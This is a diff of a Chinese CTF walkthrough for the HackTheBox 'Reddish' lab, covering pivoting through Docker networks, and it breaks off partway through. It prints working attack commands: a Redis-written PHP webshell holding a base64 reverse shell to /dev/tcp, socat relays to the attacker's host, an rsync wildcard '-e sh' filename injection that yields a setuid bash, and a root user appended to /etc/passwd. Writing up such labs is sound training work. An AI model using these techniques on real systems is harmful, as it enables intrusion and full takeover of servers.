+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.18.0.2      is alive
+(icmp) Target 172.18.0.1      is alive
+[*] LiveTop 172.18.0.0/16    段存活数量为: 2
+[*] LiveTop 172.18.0.0/24    段存活数量为: 2
+[*] Icmp alive hosts len is: 2
+[*] alive ports len is: 0
+start vulscan
+已完成 0/0
+[*] 扫描结束,耗时: 6.357711346s
+</code></pre>
 <p>现在推断</p>
 <p><strong>172.18.0.1/172.19.0.1是宿主机，172.19.0.3开放redis，172.19.0.4开放80，172.18.0.2/172.19.0.2是本机</strong></p>
 <h3>redis未授权(172.19.0.3)</h3>
 <p>搭建好隧道，用kali打redis，不过写入定时任务失败，没能拿到shell</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> proxychains4 redis-cli -h 172.19.0.3 -p 6379</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# proxychains4 redis-cli -h 172.19.0.3 -p 6379
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] Strict chain  ...  127.0.0.1:2335  ...  172.19.0.3:6379  ...  OK
-172.19.0.3:<span class="pl-k">6379&gt;</span> config get dir
-1) <span class="pl-s"><span class="pl-pds">"</span>dir<span class="pl-pds">"</span></span>
-2) <span class="pl-s"><span class="pl-pds">"</span>/data<span class="pl-pds">"</span></span>
-172.19.0.3:<span class="pl-k">6379&gt;</span></pre></div>
+172.19.0.3:6379&gt; config get dir
+1) "dir"
+2) "/data"
+172.19.0.3:6379&gt;
+</code></pre>
 <h3>内网web(172.19.0.4)</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> proxychains4 curl http://172.19.0.4/</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# proxychains4 curl http://172.19.0.4/
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] Strict chain  ...  127.0.0.1:2335  ...  172.19.0.4:80  ...  OK
-<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html PUBLIC <span class="pl-s"><span class="pl-pds">"</span>-//W3C//DTD XHTML 1.0 Strict//EN<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>html xmlns=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/1999/xhtml<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
-    <span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>meta http-equiv=<span class="pl-s"><span class="pl-pds">"</span>Content-Type<span class="pl-pds">"</span></span> content=<span class="pl-s"><span class="pl-pds">"</span>text/html; charset=UTF-8<span class="pl-pds">"</span></span>/<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Reddish<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>script src=<span class="pl-s"><span class="pl-pds">"</span>assets/jquery.js<span class="pl-pds">"</span></span> type=<span class="pl-s"><span class="pl-pds">"</span>text/javascript<span class="pl-pds">"</span></span>&gt;&lt;/script<span class="pl-k">&gt;</span>
-        <span class="pl-k">&lt;</span>script type=<span class="pl-s"><span class="pl-pds">"</span>text/javascript<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
-                                                <span class="pl-en">$(document).ready(function</span> () {
-                                                                <span class="pl-en">incrCounter</span>();
-                                                    <span class="pl-en">getData</span>();
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+    &lt;head&gt;
+        &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/&gt;
+        &lt;title&gt;Reddish&lt;/title&gt;
+        &lt;script src="assets/jquery.js" type="text/javascript"&gt;&lt;/script&gt;
+        &lt;script type="text/javascript"&gt;
+                                                $(document).ready(function () {
+                                                                incrCounter();
+                                                    getData();
                                                 });
 
-                                                <span class="pl-k">function</span> <span class="pl-en">getData()</span> {
+                                                function getData() {
                                                     $.ajax({
-                                                        url: <span class="pl-s"><span class="pl-pds">"</span>8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits<span class="pl-pds">"</span></span>,
+                                                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
                                                         cache: false,
-                                                        dataType: <span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>,
-                                                        success: <span class="pl-k">function</span> <span class="pl-en">(data)</span> {
-                                                                                        console.log(<span class="pl-s"><span class="pl-pds">"</span>Number of hits:<span class="pl-pds">"</span></span>, data)
+                                                        dataType: "text",
+                                                        success: function (data) {
+                                                                                        console.log("Number of hits:", data)
                                                         },
-                                                        error: <span class="pl-k">function</span> <span class="pl-en">()</span> {
+                                                        error: function () {
                                                         }
-                                                    })<span class="pl-k">;</span>
+                                                    });
                                                 }
 
-                                                <span class="pl-k">function</span> <span class="pl-en">incrCounter()</span> {
+                                                function incrCounter() {
                                                     $.ajax({
-                                                        url: <span class="pl-s"><span class="pl-pds">"</span>8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits<span class="pl-pds">"</span></span>,
+                                                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
                                                         cache: false,
-                                                        dataType: <span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span>,
-                                                        success: <span class="pl-k">function</span> <span class="pl-en">(data)</span> {
-                                              console.log(<span class="pl-s"><span class="pl-pds">"</span>HITS incremented:<span class="pl-pds">"</span></span>, data)<span class="pl-k">;</span>
+                                                        dataType: "text",
+                                                        success: function (data) {
+                                              console.log("HITS incremented:", data);
                                                         },
-                                                        error: <span class="pl-k">function</span> <span class="pl-en">()</span> {
+                                                        error: function () {
                                                         }
-                                                    })<span class="pl-k">;</span>
+                                                    });
                                                 }
 
-                                                /<span class="pl-k">*</span>
-                                                        <span class="pl-k">*</span> TODO
-                                                        <span class="pl-k">*</span>
-                                                        <span class="pl-k">*</span> 1. Share the web folder with the database container (Done)
-                                                        <span class="pl-k">*</span> 2. Add here the code to backup databases <span class="pl-k">in</span> /f187a0ec71ce99642e4f0afbd441a68b folder
-                                                        <span class="pl-k">*</span> ...Still don<span class="pl-s"><span class="pl-pds">'</span>t know how to complete it...</span>
-<span class="pl-s">                                                */</span>
-<span class="pl-s">                                                function backupDatabase() {</span>
-<span class="pl-s">                                                                $.ajax({</span>
-<span class="pl-s">                                                                                url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",</span>
-<span class="pl-s">                                                                                cache: false,</span>
-<span class="pl-s">                                                                                dataType: "text",</span>
-<span class="pl-s">                                                                                success: function (data) {</span>
-<span class="pl-s">                                                                                        console.log("Database saved:", data);</span>
-<span class="pl-s">                                                                                },</span>
-<span class="pl-s">                                                                                error: function () {</span>
-<span class="pl-s">                                                                                }</span>
-<span class="pl-s">                                                                });</span>
-<span class="pl-s">                                                }</span>
-<span class="pl-s">                &lt;/script&gt;</span>
-<span class="pl-s">    &lt;/head&gt;</span>
-<span class="pl-s">    &lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;</span>
-<span class="pl-s">    &lt;p&gt;This is the default web page for this server.&lt;/p&gt;</span>
-<span class="pl-s">    &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;</span>
-<span class="pl-s">    &lt;/body&gt;</span>
-<span class="pl-s">&lt;/html&gt;</span></pre></div>
+                                                /*
+                                                        * TODO
+                                                        *
+                                                        * 1. Share the web folder with the database container (Done)
+                                                        * 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
+                                                        * ...Still don't know how to complete it...
+                                                */
+                                                function backupDatabase() {
+                                                                $.ajax({
+                                                                                url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
+                                                                                cache: false,
+                                                                                dataType: "text",
+                                                                                success: function (data) {
+                                                                                        console.log("Database saved:", data);
+                                                                                },
+                                                                                error: function () {
+                                                                                }
+                                                                });
+                                                }
+                &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;
+    &lt;p&gt;This is the default web page for this server.&lt;/p&gt;
+    &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
 <p>web有提示，暴露了<code class="notranslate">/f187a0ec71ce99642e4f0afbd441a68b</code>文件目录，可以尝试redis写入webshell</p>
 <h3>shell(172.19.0.4)</h3>
 <h4>redis未授权写入webshell</h4>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> proxychains4 curl 'http://172.19.0.4/f187a0ec71ce99642e4f0afbd441a68b/shell.php?1=id' --output info</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# proxychains4 curl 'http://172.19.0.4/f187a0ec71ce99642e4f0afbd441a68b/shell.php?1=id' --output info
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
@@ -2026,129 +2031,138 @@ root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#<
 100   155   0   155   0     0   388     0  --:--:-- --:--:-- --:--:--   388
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> cat info</span>
+└─# cat info
 REDIS0008�      redis-ver4.0.9�
 redis-bits�@�ctime��3iused-mem��
                                 �
                                  aof-preamble���xuid=33(www-data) gid=33(www-data) groups=33(www-data)
-�2Ԍ^.<span class="pl-k">&gt;</span>��                                                                                                          
+�2Ԍ^.&gt;��                                                                                                          
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+└─#
+</code></pre>
 <p>这里用curl会输出文件，先测试一下一会直接写入反弹shell，走172.19.0.4的代理弹shell到kali上</p>
 <p>这里有个小坑，靶机上的马过段时间就会被删掉</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> socat TCP4-LISTEN:2330,reuseaddr,fork TCP4:10.10.16.15:2330 &amp;</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:~# socat TCP4-LISTEN:2330,reuseaddr,fork TCP4:10.10.16.15:2330 &amp;
 [1] 129
 
 ┌──(root㉿MJ)-[~]
-└─<span class="pl-c"><span class="pl-c">#</span> nc -lvnp 2330</span>
-listening on [any] 2330 ...</pre></div>
+└─# nc -lvnp 2330
+listening on [any] 2330 ...
+</code></pre>
 <p>socat做端口转发，一会kali接shell</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> proxychains4 redis-cli -h 172.19.0.3 -p 6379</span>
-172.19.0.3:<span class="pl-k">6379&gt;</span> config <span class="pl-c1">set</span> dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# proxychains4 redis-cli -h 172.19.0.3 -p 6379
+172.19.0.3:6379&gt; config set dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
 OK
-172.19.0.3:<span class="pl-k">6379&gt;</span> config <span class="pl-c1">set</span> dbfilename shell.php
+172.19.0.3:6379&gt; config set dbfilename shell.php
 OK
-172.19.0.3:<span class="pl-k">6379&gt;</span> <span class="pl-c1">set</span> x <span class="pl-s"><span class="pl-pds">'</span>&lt;?php system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4yLzIzMzAgMD4mMQo= | base64 -d | bash");?&gt;<span class="pl-pds">'</span></span>
+172.19.0.3:6379&gt; set x '&lt;?php system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4yLzIzMzAgMD4mMQo= | base64 -d | bash");?&gt;'
 OK
-172.19.0.3:<span class="pl-k">6379&gt;</span> save
+172.19.0.3:6379&gt; save
 OK
-172.19.0.3:<span class="pl-k">6379&gt;</span>
+172.19.0.3:6379&gt;
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> proxychains4 curl 'http://172.19.0.4/f187a0ec71ce99642e4f0afbd441a68b/shell.php'</span>
+└─# proxychains4 curl 'http://172.19.0.4/f187a0ec71ce99642e4f0afbd441a68b/shell.php'
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 [proxychains] Strict chain  ...  127.0.0.1:2335  ...  172.19.0.4:80  ...  OK
 
 ┌──(root㉿MJ)-[~]
-└─<span class="pl-c"><span class="pl-c">#</span> nc -lvnp 2330</span>
+└─# nc -lvnp 2330
 listening on [any] 2330 ...
 connect to [10.10.16.15] from (UNKNOWN) [10.129.17.102] 47712
-bash: cannot <span class="pl-c1">set</span> terminal process group (1): Inappropriate ioctl <span class="pl-k">for</span> device
-bash: no job control <span class="pl-k">in</span> this shell
-www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$</pre></div>
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$
+</code></pre>
 <p>拿到www-datashell</p>
 <h4>root(172.19.0.4/172.20.0.3)</h4>
 <p>发现user.txt,不过somaro用户不存在，所以得提权root读user</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@www:/$ ls -la /home/somaro/
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@www:/$ ls -la /home/somaro/
 total 24
-drwxr-xr-x 2 1000 1000 4096 Jul 16  2018 <span class="pl-c1">.</span>
+drwxr-xr-x 2 1000 1000 4096 Jul 16  2018 .
 drwxr-xr-x 5 root root 4096 Apr  9  2021 ..
-lrwxrwxrwx 1 root root    9 Apr  9  2021 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+lrwxrwxrwx 1 root root    9 Apr  9  2021 .bash_history -&gt; /dev/null
 -rw-r--r-- 1 1000 1000  220 Apr 23  2018 .bash_logout
 -rw-r--r-- 1 1000 1000 3771 Apr 23  2018 .bashrc
 -rw-r--r-- 1 1000 1000  655 Apr 23  2018 .profile
 -r-------- 1 1000 1000   33 Dec  6 06:51 user.txt
 www-data@www:/$ id somaro
-id: somaro: no such user</pre></div>
+id: somaro: no such user
+</code></pre>
 <p>可以发现个备份文件</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@www:/backup$ cat backup.sh
-<span class="pl-c1">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
-rsync -a <span class="pl-k">*</span>.rdb rsync://backup:873/src/rdb/
-<span class="pl-c1">cd</span> / <span class="pl-k">&amp;&amp;</span> rm -rf /var/www/html/<span class="pl-k">*</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@www:/backup$ cat backup.sh
+cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+rsync -a *.rdb rsync://backup:873/src/rdb/
+cd / &amp;&amp; rm -rf /var/www/html/*
 rsync -a rsync://backup:873/src/backup/ /var/www/html/
-chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</pre></div>
+chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+</code></pre>
 <p>这也解释了为什么传的马会被删掉</p>
 <p>可以看到到root三分钟就会执行一次，而且在脚本中使用了通配符，所以可以利用提权</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@www:/backup$ cat /etc/cron.d/backup
-<span class="pl-k">*</span>/3 <span class="pl-k">*</span> <span class="pl-k">*</span> <span class="pl-k">*</span> <span class="pl-k">*</span> root sh /backup/backup.sh</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@www:/backup$ cat /etc/cron.d/backup
+*/3 * * * * root sh /backup/backup.sh
+</code></pre>
 <h5>例子</h5>
 <p>rsync的-e参数可以执行命令</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> ls</span>
-<span class="pl-s"><span class="pl-pds">'</span>-e sh shell.rdb<span class="pl-pds">'</span></span>   shell.rdb
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# ls
+'-e sh shell.rdb'   shell.rdb
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> cat shell.rdb</span>
+└─# cat shell.rdb
 cp /bin/bash /tmp/test/rootbash
 chmod +s /tmp/test/rootbash
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> rsync -a *.rdb rsync://backup:873/src/rdb/</span>
+└─# rsync -a *.rdb rsync://backup:873/src/rdb/
 rsync: did not see server greeting
-rsync error: error starting client-server protocol (code 5) at main.c(1850) [sender<span class="pl-k">=</span>3.4.1]
+rsync error: error starting client-server protocol (code 5) at main.c(1850) [sender=3.4.1]
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> ls</span>
-<span class="pl-s"><span class="pl-pds">'</span>-e sh shell.rdb<span class="pl-pds">'</span></span>   rootbash   shell.rdb</pre></div>
+└─# ls
+'-e sh shell.rdb'   rootbash   shell.rdb
+</code></pre>
 <p>同理准备提权</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@www:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>cp /bin/bash /tmp/rootbash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> shell.rdb
-www-data@www:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /tmp/rootbash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;&gt;</span> shell.rdb
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@www:/tmp$ echo 'cp /bin/bash /tmp/rootbash' &gt; shell.rdb
+www-data@www:/tmp$ echo 'chmod +s /tmp/rootbash' &gt;&gt; shell.rdb
 www-data@www:/tmp$ cat shell.rdb
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
-www-data@www:/tmp$ touch ./<span class="pl-s"><span class="pl-pds">'</span>-e sh shell.rdb<span class="pl-pds">'</span></span>
+www-data@www:/tmp$ touch ./'-e sh shell.rdb'
 www-data@www:/tmp$ ls
 -e sh shell.rdb  shell.rdb
-www-data@www:/tmp$ mv ./<span class="pl-s"><span class="pl-pds">'</span>-e sh shell.rdb<span class="pl-pds">'</span></span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
+www-data@www:/tmp$ mv ./'-e sh shell.rdb' /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
 www-data@www:/tmp$ mv shell.rdb /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
 www-data@www:/tmp$ ls -al /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
 total 12
 -rw-r--r-- 1 www-data www-data    0 Dec  6 08:11 -e sh shell.rdb
-drwxr-xr-x 2 www-data www-data 4096 Dec  6 08:11 <span class="pl-c1">.</span>
+drwxr-xr-x 2 www-data www-data 4096 Dec  6 08:11 .
 drwxr-xr-x 5 root     root     4096 Jul 15  2018 ..
 -rw-r--r-- 1 www-data www-data   50 Dec  6 08:10 shell.rdb
 
 www-data@www:/tmp$ ls -al
 total 1016
-drwxrwxrwt 1 root root    4096 Dec  6 08:12 <span class="pl-c1">.</span>
+drwxrwxrwt 1 root root    4096 Dec  6 08:12 .
 drwxr-xr-x 1 root root    4096 Jul 15  2018 ..
--rwsr-sr-x 1 root root 1029624 Dec  6 08:12 rootbash</pre></div>
+-rwsr-sr-x 1 root root 1029624 Dec  6 08:12 rootbash
+</code></pre>
 <p>等待一会即可拿到rootbash，轻松拿下，不过perl有保护机制，这种情况下没法执行脚本下载工具，所以添加一个新root用户</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[~/tools/Linux]
-└─<span class="pl-c"><span class="pl-c">#</span> openssl passwd -1 -salt r00t r00t</span>
-<span class="pl-smi">$1</span><span class="pl-smi">$r00t$jI</span>/eup4otheMWcP971kiR/
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[~/tools/Linux]
+└─# openssl passwd -1 -salt r00t r00t
+$1$r00t$jI/eup4otheMWcP971kiR/
 
-rootbash-4.3# <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>r00t:$1$r00t$jI/eup4otheMWcP971kiR/:0:0:/root:/bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;&gt;</span> /etc/passwd
+rootbash-4.3# echo 'r00t:$1$r00t$jI/eup4otheMWcP971kiR/:0:0:/root:/bin/bash' &gt;&gt; /etc/passwd
 rootbash-4.3# su r00t
 Password:
 bash: /bin/bash/.bashrc: Not a directory
 root@www:/tmp# id
-uid=0(root) gid=0(root) groups=0(root)</pre></div>
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
 <p>入口机器再做个端口转发，下载工具用</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> socat TCP4-LISTEN:2331,reuseaddr,fork TCP4:10.10.16.15:2331 &amp;</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:~# socat TCP4-LISTEN:2331,reuseaddr,fork TCP4:10.10.16.15:2331 &amp;
 [2] 133
 
 root@www:/root# perl downloader.pl 172.19.0.2 2331 fscan fscan
@@ -2156,72 +2170,78 @@ Saved fscan
 root@www:/root# chmod +x fscan
 root@www:/root# mv fscan /usr/bin/
 root@www:/root# ip a
-1: lo: <span class="pl-k">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
-17: eth0@if18: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc noqueue state UP group default
+17: eth0@if18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
     link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
     inet 172.19.0.4/16 brd 172.19.255.255 scope global eth0
        valid_lft forever preferred_lft forever
-19: eth1@if20: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc noqueue state UP group default
+19: eth1@if20: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
     link/ether 02:42:ac:14:00:03 brd ff:ff:ff:ff:ff:ff
     inet 172.20.0.3/16 brd 172.20.255.255 scope global eth1
-       valid_lft forever preferred_lft forever</pre></div>
+       valid_lft forever preferred_lft forever
+</code></pre>
 <p>同样的这台机器也是非特权容器，按照上述可以判断，同时也可以发现这个主机有一块新的内网网卡，网段172.20.0.1/16，继续打第二层内网</p>
 <h2>二层内网横向</h2>
 <h3>root(172.20.0.2)</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@www:/root# fscan -h 172.20.0.3/16
+<pre lang="bash" class="notranslate"><code class="notranslate">root@www:/root# fscan -h 172.20.0.3/16
 
    ___                              _
-  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __
- / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
-<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span>
-<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\</span>
-<span class="pl-s">                     fscan version: 1.8.4</span>
-<span class="pl-s">start infoscan</span>
-<span class="pl-s">(icmp) Target 172.20.0.3      is alive</span>
-<span class="pl-s">(icmp) Target 172.20.0.1      is alive</span>
-<span class="pl-s">(icmp) Target 172.20.0.2      is alive</span>
-<span class="pl-s">[*] LiveTop 172.20.0.0/16    段存活数量为: 3</span>
-<span class="pl-s">[*] LiveTop 172.20.0.0/24    段存活数量为: 3</span>
-<span class="pl-s">[*] Icmp alive hosts len is: 3</span>
-<span class="pl-s">172.20.0.3:80 open</span>
-<span class="pl-s">[*] alive ports len is: 1</span>
-<span class="pl-s">start vulscan</span>
-<span class="pl-s">[*] WebTitle http://172.20.0.3         code:200 len:2023   title:Reddish</span>
-<span class="pl-s">已完成 1/1</span>
-<span class="pl-s">[*] 扫描结束,耗时: 6.862927535s</span></pre></div>
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.20.0.3      is alive
+(icmp) Target 172.20.0.1      is alive
+(icmp) Target 172.20.0.2      is alive
+[*] LiveTop 172.20.0.0/16    段存活数量为: 3
+[*] LiveTop 172.20.0.0/24    段存活数量为: 3
+[*] Icmp alive hosts len is: 3
+172.20.0.3:80 open
+[*] alive ports len is: 1
+start vulscan
+[*] WebTitle http://172.20.0.3         code:200 len:2023   title:Reddish
+已完成 1/1
+[*] 扫描结束,耗时: 6.862927535s
+</code></pre>
 <p>可以看到大概率172.20.0.1也是宿主机，还存活了一个172.20.0.2，刚才再定时任务备份文件中发现，这台docker容器会使用rsync与backup主机传递信息，所以本地的dns缓存一定可以看到这台主机的ip，可以猜测172.20.0.2就是backup了，同样下面也可以证实</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@www:/root# getent hosts backup
-172.20.0.2      backup</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@www:/root# getent hosts backup
+172.20.0.2      backup
+</code></pre>
 <p>这里的 <strong>/src 不是系统路径</strong><br>
 而是 rsync 守护进程配置文件里的 module 名称，配置文件一定存在</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">[src]
+<pre lang="bash" class="notranslate"><code class="notranslate">[src]
    path = /backup
-   <span class="pl-c1">read</span> only = <span class="pl-c1">false</span>
-   list = <span class="pl-c1">true</span></pre></div>
+   read only = false
+   list = true
+</code></pre>
 <p>后续打下backup也可以证明这一点</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@www:/backup# cat backup.sh
-<span class="pl-c1">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
-rsync -a <span class="pl-k">*</span>.rdb rsync://backup:873/src/rdb/
-<span class="pl-c1">cd</span> / <span class="pl-k">&amp;&amp;</span> rm -rf /var/www/html/<span class="pl-k">*</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@www:/backup# cat backup.sh
+cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+rsync -a *.rdb rsync://backup:873/src/rdb/
+cd / &amp;&amp; rm -rf /var/www/html/*
 rsync -a rsync://backup:873/src/backup/ /var/www/html/
-chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</pre></div>
+chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+</code></pre>
 <p>既然能穿文件，可以先试一下，在backup主机的权限</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@www:/backup# <span class="pl-c1">echo</span> 123 <span class="pl-k">&gt;</span> <span class="pl-c1">test</span>
-root@www:/backup# rsync -a <span class="pl-c1">test</span> rsync://backup:873/src/root/
+<pre lang="bash" class="notranslate"><code class="notranslate">root@www:/backup# echo 123 &gt; test
+root@www:/backup# rsync -a test rsync://backup:873/src/root/
 root@www:/backup# rsync rsync://backup:873/src/root/test
--rw-r--r--              4 2025/12/06 08:28:32 <span class="pl-c1">test</span></pre></div>
+-rw-r--r--              4 2025/12/06 08:28:32 test
+</code></pre>
 <p>root都能传那肯定就是root无疑了，写个定时任务弹shell即可</p>
 <p>先去kali下个nc然后监听2333端口，接backup的shell即可,这里记得给sh加个执行权限，不然弹不上</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@www:/backup# ls
